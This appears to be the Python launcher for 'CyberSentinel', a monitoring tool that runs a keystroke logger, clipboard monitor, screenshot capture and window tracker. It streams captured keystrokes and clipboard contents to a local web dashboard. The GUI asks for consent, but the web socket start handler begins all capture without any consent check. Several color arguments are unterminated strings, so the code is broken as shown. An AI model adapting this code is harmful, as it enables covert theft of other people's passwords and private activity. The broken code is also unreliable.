import sys
import threading
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from flask import Flask, render_template, jsonify, request, send_from_directory
from flask_socketio import SocketIO, emit

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from config.settings import (
    APP_NAME, APP_VERSION, APP_TAGLINE, SESSION_ID,
    AUTO_STOP_HOURS, BUFFER_SIZE, FLUSH_INTERVAL_SECONDS,
    CAPTURE_SPECIAL_KEYS, CAPTURE_TIMESTAMPS,
    CLIPBOARD_ENABLED, CLIPBOARD_POLL_INTERVAL,
    SCREENSHOT_ENABLED, SCREENSHOT_INTERVAL,
    SCREENSHOT_QUALITY, SCREENSHOT_FORMAT, SCREENSHOT_DIR,
    EMAIL_ENABLED, LOG_DIR, EXPORT_DIR,
)
from utils.encryption import EncryptionManager
from core.keylogger import KeystrokeEngine
from core.clipboard import ClipboardMonitor
from core.screenshot import ScreenshotCapture
from core.window_tracker import WindowTracker
from storage.file_handler import FileHandler
from utils.system_info import SystemProfiler
from utils.consent import ConsentManager

crypto             = EncryptionManager()
keylogger          = KeystrokeEngine(encryption_manager=crypto)
clipboard_monitor  = ClipboardMonitor(encryption_manager=crypto)
screenshot_capture = ScreenshotCapture()
window_tracker     = WindowTracker()
file_handler       = FileHandler(encryption_manager=crypto)
sys_profiler       = SystemProfiler()
consent_mgr        = ConsentManager()

_monitoring = False

flask_app = Flask(__name__, template_folder="templates")
flask_app.config["SECRET_KEY"] = "cybersentinel-web-key"
socketio = SocketIO(flask_app, async_mode="threading")

def _on_key_event_web(record):
    try:
        socketio.emit("keystroke", record)
    except Exception:
        pass

def _on_clip_event_web(entry):
    try:
        socketio.emit("clipboard_update", entry)
    except Exception:
        pass

@flask_app.route("/")
def web_index():
    return render_template(
        "web_dashboard.html",
        app_name=APP_NAME,
        app_version=APP_VERSION,
        app_tagline=APP_TAGLINE,
        session_id=SESSION_ID,
        auto_stop_hours=AUTO_STOP_HOURS,
    )

@flask_app.route("/api/stats")
def web_api_stats():
    return jsonify({
        "keylogger":      keylogger.get_stats(),
        "clipboard":      clipboard_monitor.get_stats(),
        "screenshot":     screenshot_capture.get_stats(),
        "window_tracker": window_tracker.get_stats(),
        "encryption":     crypto.get_status(),
        "monitoring":     _monitoring,
    })

@flask_app.route("/api/sysinfo")
def web_api_sysinfo():
    try:
        return jsonify(sys_profiler.collect_all())
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@flask_app.route("/api/logs")
def web_api_logs():
    return jsonify(file_handler.list_log_files())

@flask_app.route("/api/storage")
def web_api_storage():
    return jsonify(file_handler.get_storage_stats())

@flask_app.route("/api/screenshots/list")
def web_api_screenshot_list():
    return jsonify(screenshot_capture.get_recent_captures())

@flask_app.route("/screenshots/<path:filename>")
def web_serve_screenshot(filename):
    return send_from_directory(str(SCREENSHOT_DIR), filename)

@flask_app.route("/api/settings")
def web_api_settings():
    return jsonify({
        "buffer_size":              BUFFER_SIZE,
        "flush_interval":           FLUSH_INTERVAL_SECONDS,
        "capture_special_keys":     CAPTURE_SPECIAL_KEYS,
        "capture_timestamps":       CAPTURE_TIMESTAMPS,
        "clipboard_enabled":        CLIPBOARD_ENABLED,
        "clipboard_poll_interval":  CLIPBOARD_POLL_INTERVAL,
        "screenshot_enabled":       SCREENSHOT_ENABLED,
        "screenshot_interval":      SCREENSHOT_INTERVAL,
        "screenshot_quality":       SCREENSHOT_QUALITY,
        "screenshot_format":        SCREENSHOT_FORMAT,
        "email_enabled":            EMAIL_ENABLED,
        "auto_stop_hours":          AUTO_STOP_HOURS,
        "log_dir":                  str(LOG_DIR),
        "screenshot_dir":           str(SCREENSHOT_DIR),
        "export_dir":               str(EXPORT_DIR),
    })

@flask_app.route("/api/export/<fmt>", methods=["POST"])
def web_api_export(fmt):
    if fmt not in ("txt", "csv", "json"):
        return jsonify({"error": "Invalid format"}), 400
    try:
        path = file_handler.export_logs(output_format=fmt)
        return jsonify({"success": True, "path": str(path)})
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@flask_app.route("/api/screenshot/capture", methods=["POST"])
def web_api_capture():
    path = screenshot_capture.capture_now()
    if path:
        return jsonify({"success": True, "path": str(path)})
    return jsonify({"error": "Capture failed"}), 500

@socketio.on("start_monitoring")
def ws_handle_start():
    global _monitoring
    _start_monitoring()
    emit("monitoring_status", {"active": True}, broadcast=True)

@socketio.on("stop_monitoring")
def ws_handle_stop():
    global _monitoring
    _stop_monitoring()
    emit("monitoring_status", {"active": False}, broadcast=True)

@socketio.on("connect")
def ws_handle_connect():
    emit("monitoring_status", {"active": _monitoring})

def _broadcast_stats():
    while True:
        socketio.sleep(1)
        try:
            cpu = psutil.cpu_percent(interval=0) if PSUTIL_AVAILABLE else 0
            ram = psutil.virtual_memory().percent if PSUTIL_AVAILABLE else 0
        except Exception:
            cpu, ram = 0, 0

        data = {
            "keylogger":      keylogger.get_stats(),
            "clipboard":      clipboard_monitor.get_stats(),
            "screenshot":     screenshot_capture.get_stats(),
            "window_tracker": window_tracker.get_stats(),
            "cpu": cpu,
            "ram": ram,
            "monitoring": _monitoring,
        }
        socketio.emit("stats_update", data)

def start_web_server():
    socketio.start_background_task(_broadcast_stats)
    socketio.run(
        flask_app,
        host="127.0.0.1",
        port=5000,
        debug=False,
        use_reloader=False,
        allow_unsafe_werkzeug=True,
        log_output=False,
    )

def _start_monitoring():
    global _monitoring
    if _monitoring:
        return
    if not keylogger.is_running:
        keylogger.start()
    if not clipboard_monitor.is_running:
        clipboard_monitor.start()
    if not screenshot_capture.is_running:
        screenshot_capture.start()
    if not window_tracker.is_running:
        window_tracker.start()
    _monitoring = True

def _stop_monitoring():
    global _monitoring
    if not _monitoring:
        return
    if keylogger.is_running:
        keylogger.stop()
    if clipboard_monitor.is_running:
        clipboard_monitor.stop()
    if screenshot_capture.is_running:
        screenshot_capture.stop()
    if window_tracker.is_running:
        window_tracker.stop()
    _monitoring = False

def start_desktop_gui():
    from ui.gui_dashboard import CyberSentinelApp

    app = CyberSentinelApp(
        keylogger=keylogger,
        clipboard=clipboard_monitor,
        screenshot=screenshot_capture,
        window_tracker=window_tracker,
        encryption=crypto,
        file_handler=file_handler,
        system_profiler=sys_profiler,
        consent_manager=consent_mgr,
    )

    app._start_all_original = app._start_all
    app._stop_all_original = app._stop_all

    def gui_start_all():
        global _monitoring
        if consent_mgr and consent_mgr.required:
            from ui.consent_dialog import ConsentDialog
            dialog = ConsentDialog(app)
            app.wait_window(dialog)
            if not dialog.result:
                return
            consent_mgr._consent_granted = True
            consent_mgr._record_consent(granted=True)

        _start_monitoring()
        app._monitoring = True
        app._w["btn_toggle"].configure(
            text="■  STOP MONITORING",
            fg_color="
            text_color="
        )

    def gui_stop_all():
        global _monitoring
        _stop_monitoring()
        app._monitoring = False
        app._w["btn_toggle"].configure(
            text="▶  START MONITORING",
            fg_color="
            text_color="
        )

    app._start_all = gui_start_all
    app._stop_all = gui_stop_all

    original_on_closing = app._on_closing
    def on_closing():
        _stop_monitoring()
        original_on_closing()

    app._on_closing = on_closing
    app.protocol("WM_DELETE_WINDOW", on_closing)

    app.mainloop()

def main():
    keylogger.set_key_callback(_on_key_event_web)
    clipboard_monitor.set_capture_callback(_on_clip_event_web)

    print()
    print(f"  🛡️  {APP_NAME} — Unified Launcher")
    print(f"  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"  🖥️   Desktop GUI: Opening window...")
    print(f"  🌐  Web Dashboard: http://127.0.0.1:5000")
    print(f"  🔑  Session: {SESSION_ID}")
    print()

    web_thread = threading.Thread(
        target=start_web_server,
        name="WebDashboard",
        daemon=True,
    )
    web_thread.start()

    start_desktop_gui()

if __name__ == "__main__":
    main()
